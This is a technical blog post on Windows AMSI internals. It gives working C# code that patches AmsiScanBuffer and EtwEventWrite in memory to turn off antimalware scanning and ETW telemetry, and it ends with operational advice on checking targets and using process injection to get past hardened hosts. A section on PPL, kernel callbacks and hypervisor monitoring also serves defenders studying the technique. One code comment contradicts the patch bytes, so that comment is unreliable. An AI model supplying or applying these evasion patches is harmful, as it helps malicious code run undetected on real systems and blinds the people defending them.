---
title: "AMSI Internals — Patching the Provider from Userland"
description: "How AMSI is wired into the CLR and PowerShell engine, why patching AmsiScanBuffer still works in 2025 on unprotected processes, and what actually stops it in hardened environments."
pubDate: 2025-02-03
tags: [amsi, edr-evasion, windows-internals, memory-patching]
---

## AMSI Architecture

The Antimalware Scan Interface is a COM-based API surface, not a kernel driver. It lives in `amsi.dll`, which is loaded into the process address space of every AMSI-aware host application.

### Integration Points

```
PowerShell.exe
  └── System.Management.Automation.dll (SMA)
       └── amsi.dll
            ├── AmsiInitialize()       // called once at startup
            ├── AmsiOpenSession()      // per-runspace
            ├── AmsiScanBuffer()       // called before each script block executes
            └── AmsiCloseSession()
```

The CLR calls `AmsiScanBuffer` synchronously in the script block execution pipeline. If the return code is `AMSI_RESULT_DETECTED`, execution halts and the error is surfaced to the user.

`amsi.dll` itself does not contain signature logic — it is a **forwarding layer** that passes the buffer to registered AMSI providers. On a default Windows install, Windows Defender registers as the sole provider.

## Classic Patch — AmsiScanBuffer

The technique is well-documented and still functional in processes where a PPL-aware EDR hasn't locked the module:

```csharp
// Resolve AmsiScanBuffer address
var lib  = LoadLibrary("amsi.dll");
var func = GetProcAddress(lib, "AmsiScanBuffer");

// Patch the first bytes to force AMSI_RESULT_CLEAN (return 0x01)
// On x64: mov eax, 0x80070057; ret
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

VirtualProtect(func, patch.Length, PAGE_EXECUTE_READWRITE, out uint old);
Marshal.Copy(patch, 0, func, patch.Length);
VirtualProtect(func, patch.Length, old, out _);
```

> **Why `0x80070057`?** This is `E_INVALIDARG`. The AMSI consumer (PowerShell, etc.) treats non-zero return codes from `AmsiScanBuffer` as scan failures and continues execution rather than blocking. The exact error value matters less than the function returning non-success.

### ETW Provider Patch

AMSI emits telemetry via ETW. In high-confidence environments, defenders correlate ETW events with AMSI scan results. The provider can be silenced by patching `EtwEventWrite` to return immediately:

```csharp
// ntdll!EtwEventWrite — patch to ret immediately
var ntdll    = GetModuleHandle("ntdll.dll");
var etwWrite = GetProcAddress(ntdll, "EtwEventWrite");

byte[] nopRet = { 0xC3 };  // ret
VirtualProtect(etwWrite, 1, PAGE_EXECUTE_READWRITE, out uint old);
Marshal.Copy(nopRet, 0, etwWrite, 1);
VirtualProtect(etwWrite, 1, old, out _);
```

> **Warning:** patching `EtwEventWrite` globally affects all ETW consumers in the process. Some EDR agents detect this as a tamper signal more reliably than the AMSI patch itself.

## What Actually Blocks This in 2025

### Protected Process Light (PPL)

EDR agents that run as PPL or sign their injected DLLs with a Microsoft-signed certificate can mark pages as non-writable in a way that `VirtualProtect` in a non-PPL process cannot override. The call succeeds but the write silently fails.

### Kernel Callbacks

`PsSetLoadImageNotifyRoutine` lets kernel drivers inspect every DLL load. An EDR callback can verify the integrity of `amsi.dll` on every load — if the export table checksum is wrong, the agent acts.

### Hardware Breakpoints / Hypervisor-Based Monitoring

Some EDR products use hypervisor-level memory introspection (HVCI) to monitor writes to sensitive function prologues. Patching succeeds in the process VA space, but the hypervisor restores the original bytes before execution reaches that address.

## Operational Guidance

In unprotected PowerShell processes (non-Constrained Language Mode, no PPL-backed EDR), the classic patch remains viable. The key is pre-execution context assessment:

```
1. Check if running in CLM:   $ExecutionContext.SessionState.LanguageMode
2. Check loaded modules:      [System.Reflection.Assembly]::LoadWithPartialName("amsi")
3. Verify patch success:      call AmsiScanBuffer with known malicious string post-patch
```

For hardened targets, process injection into a non-AMSI-initialised process (e.g., a native binary that never called `AmsiInitialize`) is a more reliable path.
